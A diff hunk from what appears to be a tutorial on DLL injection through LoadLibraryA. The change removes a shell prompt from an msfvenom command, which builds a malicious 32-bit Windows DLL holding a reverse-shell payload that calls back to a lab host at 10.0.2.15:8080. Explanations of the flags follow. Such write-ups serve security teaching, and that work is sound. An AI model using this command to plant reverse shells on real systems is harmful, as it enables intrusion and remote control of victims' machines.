@@ -348,7 +348,7 @@ We will be using the fact that the [LoadLibraryA](https://learn.microsoft.com/en
 We can **generate** the malicious DLL using [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) as it is capable of formatting output for use as a DLL. In this case, the shellcode will be contained in the DLL Main function previously discussed!
 
 ```
-$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=none -f dll -o mal.dll
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=none -f dll -o mal.dll
 ```
 * `-a x86`: Specify this is against a 32-bit program.
 * `--platform windows`: Specify this is against a process on a Windows system.
